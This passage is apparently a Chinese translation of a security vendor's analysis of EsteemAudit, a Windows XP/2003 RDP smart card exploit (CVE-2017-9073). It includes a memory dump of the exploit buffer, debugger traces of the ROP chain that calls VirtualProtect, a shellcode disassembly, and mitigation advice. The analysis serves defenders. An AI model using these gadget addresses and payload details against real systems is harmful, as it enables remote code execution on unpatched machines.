+我们注意到一个没有符号信息的函数sub_8009094调用DoSCardTransmit并拷贝expbuffer到0x080x90d8中，在Windows2003中这个地址没有ASLR保护并且存放用户发送的数据包中的原始数据。
+
+    
+    
+    0:003> dc 080190d8 L1c0/4
+    080190d8  d26ccf61 08011e7a 0801118e 08005e85  a.l.z……..^..
+    080190e8  0800bedd 11111111 9d273fbe e636c0ea  ………?’…6.
+    080190f8  00000000 b02838fd 08011fef 08019078  …..8(…..x…
+    08019108  3005123c 22222222 00000000 f7a1d915  <..0″”””……..
+    08019118  00004000 080128cc 0000008f 7ffe0300  .@…(……….
+    08019128  08015074 08019148 08019118 ffffffff  tP..H………..
+    08019138  08019130 08019118 00000040 08019130  0…….@…0…
+    08019148  8b6404b0 06002d00 c4890000 00e8c689  ..d..-……….
+    08019158  90000000 d5858b5d 89000000 858b0446  ….]…….F…
+    08019168  000000d9 310c4689 104689c0 8b144689  …..F.1..F..F..
+    08019178  0000dd85 8b008b00 0000bc80 18468900  …………..F.
+    08019188  00e1858b 008b0000 8b1c4689 0000e585  ………F……
+    08019198  89008b00 468b2046 2846890c 4689c031  ….F .F..F(1..F
+    080191a8  00b5e82c c0850000 468b6675 0846892c  ,…….uf.F,.F.
+    080191b8  2b0c468b 89501046 468b50e0 10460308  .F.+F.P..P.F..F.
+    080191c8  50c03150 ff1476ff 76ff0476 1876ff20  P1.P.v..v..v .v.
+    080191d8  591c56ff 8b144689 c8011046 8b104689  .V.Y.F..F….F..
+    080191e8  46890846 10468b24 00d9853b c07c0000  F..F$.F.;…..|.
+    080191f8  4689c031 244e8b10 0189c889 0471ff51  1..F..N$….Q.q.
+    08019208  c083c889 d0ff5014 03ebc031 5048c031  …..P..1…1.HP
+    08019218  852c468b 8b0e74c0 58e81058 85000000  .F,..t..X..X….
+    08019228  ff0274db c3e431d3 080192d8 00006346  .t…1……Fc..
+    08019238  08176dd8 0800119c 080011cc 000012b8  .m…………..
+    08019248  24548d00 c22ecd04 18c20018 0057b800  ..T$……….W.
+    08019258  548d0000 2ecd0424 6a0010c2 30006840  …T$……j@h.0
+    08019268  468d0000 c0315028 2c468d50 48c03150  …F(P1.P.F,P1.H
+    08019278  ffc6e850 68c3ffff 00008000 5028468d  P……h…..F(P
+    08019288  502c468d 5048c031 ffffc0e8 6578c3ff  .F,P1.HP……xe
+
+当漏洞利用数据包中的数据部署完成后，gpkcsp!MyCPAcquireContext处理ReleaseProvider路径。
+
+此时在函数CryptDestroyKey中会利用C++类的虚表完成虚函数调用KeyObject->release
+
+接下来的调试信息展示了如何控制EIP和执行shellcode。这个exploit利用了SharedUserData技术去调用KiFastSystemCall来执行函数VirtualProtect，将内存0x80190d8的属性设置成可写和执行，然后在地址0x8019148执行shellcode。这时exploit就完成了第一阶段的工作。
+
+    
+    
+    0:011> g 08007c2b
+    eax=080190dc ebx=77f3f5b0 ecx=02cdaff8 edx=00000000 esi=000000b8 edi=00000000
+    eip=08007c2b esp=02dfe40c ebp=02dfe420 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!ReleaseProvider+0xef:
+    08007c2b ffd3            call    ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}
+    0:011>
+    eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
+    eip=77f3f615 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    ADVAPI32!CryptDestroyKey+0x6e:
+    77f3f615 ff5608          call    dword ptr [esi+8]    ds:0023:080190e4=08005e85
+    0:011> t
+    eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
+    eip=08005e85 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!GetAppWindow+0x1c:
+    08005e85 8bc6            mov     eax,esi
+    0:011>
+    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
+    eip=08005e87 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!GetAppWindow+0x1e:
+    08005e87 5e              pop     esi
+    0:011>
+    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=08005e88 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!GetAppWindow+0x1f:
+    08005e88 c3              ret
+    0:011> t
+    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=0800bedd esp=02dfe3c4 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!funcCheck+0x129:
+    0800bedd 94              xchg    eax,esp
+    0:011> t
+    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=0800bede esp=080190dc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!funcCheck+0x12a:
+    0800bede c3              ret
+    0:011> t
+    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=08011e7a esp=080190e0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!MyCPSignHash+0x3ac:
+    08011e7a c21c00          ret     1Ch
+    0:011> t
+    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=0801118e esp=08019100 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!MyCPImportKey+0xac3:
+    0801118e c21800          ret     18h
+    0:011> t
+    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=08011fef esp=0801911c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!__report_gsfailure+0xdf:
+    08011fef c3              ret
+    0:011> t
+    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=080128cc esp=08019120 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!CC_Exit+0x4f:
+    080128cc 58              pop     eax
+    0:011> t
+    eax=0000008f ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=080128cd esp=08019124 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!CC_Exit+0x50:
+    080128cd 5b              pop     ebx
+    0:011> t
+    eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=080128ce esp=08019128 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!CC_Exit+0x51:
+    080128ce c3              ret
+    0:011> t
+    eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
+    eip=08015074 esp=0801912c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    gpkcsp!CC_Exit+0x27f7:
+    08015074 ff23            jmp     dword ptr [ebx]      ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c9585e8)}
+    Shellcode start:
+    No prior disassembly possible
+    08019148 b004            mov     al,4
+    0801914a 648b00          mov     eax,dword ptr fs:[eax]
+    0801914d 2d00060000      sub     eax,600h
+    08019152 89c4            mov     esp,eax
+    08019154 89c6            mov     esi,eax
+    08019156 e800000000      call    gpkcsp!IsProgButtonClick+0x8f (0801915b)
+    0801915b 90              nop
+    0801915c 5d              pop     ebp
+    0801915d 8b85d5000000    mov     eax,dword ptr [ebp+0D5h]
+    08019163 894604          mov     dword ptr [esi+4],eax
+    08019166 8b85d9000000    mov     eax,dword ptr [ebp+0D9h]
+    0801916c 89460c          mov     dword ptr [esi+0Ch],eax
+    0801916f 31c0            xor     eax,eax
+    08019171 894610          mov     dword ptr [esi+10h],eax
+    08019174 894614          mov     dword ptr [esi+14h],eax
+    08019177 8b85dd000000    mov     eax,dword ptr [ebp+0DDh]
+    0801917d 8b00            mov     eax,dword ptr [eax]
+    0801917f 8b80bc000000    mov     eax,dword ptr [eax+0BCh]
+    08019185 894618          mov     dword ptr [esi+18h],eax
+    08019188 8b85e1000000    mov     eax,dword ptr [ebp+0E1h]
+    0801918e 8b00            mov     eax,dword ptr [eax]
+    08019190 89461c          mov     dword ptr [esi+1Ch],eax
+    08019193 8b85e5000000    mov     eax,dword ptr [ebp+0E5h]
+    08019199 8b00            mov     eax,dword ptr [eax]
+    0801919b 894620          mov     dword ptr [esi+20h],eax
+    0801919e 8b460c          mov     eax,dword ptr [esi+0Ch]
+    080191a1 894628          mov     dword ptr [esi+28h],eax
+    080191a4 31c0            xor     eax,eax
+    080191a6 89462c          mov     dword ptr [esi+2Ch],eax
+    080191a9 e8b5000000      call    gpkcsp!IsProgButtonClick+0x197 (08019263)
+    …
+    0:011> !address 08019148
+    Failed to map Heaps (error 80004005)
+    Usage:                  Image
+    Allocation Base:        08000000
+    Base Address:           08019000
+    End Address:            0801e000
+    Region Size:            00005000
+    Type:                   01000000    MEM_IMAGE
+    State:                  00001000    MEM_COMMIT
+    Protect:                00000040   PAGE_EXECUTE_READWRITE
+    More info:              lmv m gpkcsp
+    More info:              !lmi gpkcsp
+    More info:              ln 0x8019148
+
+**检测和暂时缓解措施**
+
+CVE-2017-9073仅存在Windows XP和Windows
+2003上，且这两个系统不再收到微软的支持。所以用户应该在第一时间升级到最新版的Windows系统。由于漏洞出现在RDP的智能卡模块，所以以下措施也可以暂时缓解漏洞：
+
+在组策略中关闭智能卡模块
+
+在注册表中关闭智能卡模块。在路径HKLMSOFTWAREPoliciesMicrosoftWindows NTTerminal
+Services下增加或者设置键值0，类型为REG_DWORD
+
+关闭或者限制外接的RDP访问请求
+
+  
+
+**总结**
+
+RDP是Windows上非常有用且非常复杂的模块。基于我们对EsteemAudit的分析，这个漏洞本身并不难发现。不过难点在如何进行成功的利用。有趣的是gpkcsp选择了一个全局变量来存储客户端发来的原始数据，这样可以使攻击者在没有ASLR的情况下在一个固定的已知地址部署完全可控的数据。利用工具的作者利用了这个特性完成了exploit。EsteemAudit是一个在Windows
+XP和Windows
+2003上的利用工具。用户需要在类似于WanaCryp0t有蠕虫行为的病毒利用这个工具进行大规模传播前前，进行XP和2003系统的暂时缓解措施避免财产损失。
+
+本文翻译自paloaltonetworks.com
+[原文链接](http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **WeaponX** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/86213](/post/id/86213)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[paloaltonetworks.com](http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/)
+
+如若转载,请注明出处：
+<http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p3.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) WeaponX
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
